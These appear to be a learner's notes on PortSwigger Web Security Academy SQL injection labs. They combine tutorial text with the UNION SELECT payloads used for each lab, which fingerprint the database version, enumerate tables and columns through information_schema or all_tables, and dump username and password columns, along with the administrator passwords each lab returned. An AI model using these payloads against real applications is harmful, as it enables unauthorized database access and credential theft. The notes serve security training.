
# [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

Payload: ' UNION SELECT NULL,NULL,NULL-- in the product filter 

## Database-specific syntax

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

`' UNION SELECT NULL FROM DUAL--`

The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

For more details of database-specific syntax, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`

If the column data type is not compatible with string data, the injected query will cause a database error

# [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Payload: ' UNION SELECT NULL,'lWFNwb',NULL--

## Using a SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

In this example, you can retrieve the contents of the `users` table by submitting the input:

`' UNION SELECT username, password FROM users--`

In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.
# [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
Payload: ' UNION SELECT username, password FROM users-- in filter category

administrator: fytzk7oercmvn78e9rix

# Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.
## Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

|                  |                           |
| ---------------- | ------------------------- |
| Database type    | Query                     |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |
|                  |                           |

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`

# [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Payload in category filter intercept Burp Suite: '+UNION+SELECT+BANNER,+BANNER+FROM+v$version--

# [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
Payload in category filter intercept Burp Suite:  '+UNION+SELECT+@@version,+null#

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

# [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
Retrieve the list of tables in the database:
    '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 
 Retrieve the details of the columns in the table:
	'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qacpio'--

Retrieve data:
'+UNION+SELECT+username_hmmcdz,+password_ltpnsp+FROM+users_qacpio--

administrator: ccumt1xqlrb8dued8nfy

### Listing the contents of an Oracle database

On Oracle, you can find the same information as follows:

- You can list tables by querying `all_tables`:
    `SELECT * FROM all_tables`
    
- You can list columns by querying `all_tab_columns`:
    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

# [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
Important: On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

Retrieve table names: '+UNION+SELECT+table_name,'a'+from+all_tables--
USERS_YKYEJH

Retrieve column names: '+UNION+SELECT+column_name,null+from+all_tab_columns+where+table_name='USERS_YKYEJH'--

PASSWORD_AUNSNJ
USERNAME_ISJVNO

Retrieve credentials: '+UNION+SELECT+USERNAME_ISJVNO,PASSWORD_AUNSNJ+from+USERS_YKYEJH--

administrator: q98g7ytazghl3inbnggt

## Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

# [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
Check the database type and column type and count:
' UNION SELECT NULL,'a'--
It is non-Oracle.

Retrieve tables:
'+UNION+SELECT+null,table_name+from+information_schema.tables--
users

Retrieve columns:
'+UNION+SELECT+null,column_name+from+information_schema.columns+where+table_name='users'--
username
password

Retrieve credentials:
'+UNION+SELECT+null,username || '~' || password+from+users--
administrator~2915wf3sefqfqj3cbxa4